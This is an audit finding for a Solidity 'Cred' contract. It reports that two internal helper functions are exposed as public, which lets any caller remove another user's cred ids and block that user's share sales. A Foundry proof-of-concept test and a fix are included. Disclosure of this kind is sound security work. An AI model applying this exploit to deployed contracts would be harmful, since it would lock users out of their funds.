# Vulnerability details

## Impact
In `Cred` two functions `_addCredIdPerAddress` and `_removeCredIdPerAddress` are mistakenly labelled with `public` visibility. This means that a malicious user can block a user from selling their cred shares by calling `Cred::_removeCredIdPerAddress(credId, targetUser)` for each of the target users cred ids, then when the user attempts to sell their cred shares, when the `_removeCredIdPerAddress` function is called within either `_handleTrade` or `_executeBatchTrade` the sale will revert because of the following check:
```solidity
    if (_credIdsPerAddress[sender_].length == 0) revert EmptyArray();
```

## Proof of Concept
Add the following test to `Cred.t.sol` for an example of this:
```solidity
    function test_Toad_forceRemoveCredId() public {
        vm.warp(START_TIME + 1);

        _createCred("BASIC", "SIGNATURE", 0x0);

        // User buys a cred share
        address buyer = makeAddr("buyer");
        vm.deal(buyer, 0.1 ether);
        vm.prank(buyer);
        cred.buyShareCred{value: 0.1 ether}(1, 1, 0.1 ether);

        // Attacker unattaches credIds link to user
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        cred._removeCredIdPerAddress(1, buyer);

        // User attempts to sell their share
        vm.prank(buyer);
        vm.warp(block.timestamp + 11 minutes);
        vm.expectRevert(ICred.EmptyArray.selector);
        cred.sellShareCred(1,1,0);
    }
```

## Recommended Mitigation
Both the `_addCredIdPerAddress` and `_removeCredIdPerAddress` functions should be marked as `internal`, stopping external forces from being able to call them.
